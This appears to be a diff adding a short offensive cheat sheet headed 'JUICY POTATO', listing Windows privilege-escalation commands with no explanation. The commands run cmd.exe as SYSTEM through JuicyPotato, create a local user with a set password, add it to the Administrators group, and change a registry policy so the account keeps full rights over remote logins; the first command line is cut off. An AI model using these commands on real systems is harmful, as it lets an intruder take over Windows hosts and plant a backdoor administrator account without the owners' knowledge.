@@ -1,0 +1,5 @@
+JUICY POTATO 
+JP.exe -t * -p C:\Windows\System32\cmd.exe -a "/c
+JP.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net user D1ie3z test123!$ /add" -l 1234 (ADD USER)
+JP.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net localgroup Administrators D1ie3z /add" -l 1234 (ASIGN ADMIN)
+JP.exe -t * -p C:\Windows\System32\cmd.exe -a "/c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f" -l 1234 (MODIFY REGISTER TO GET ADMIN)
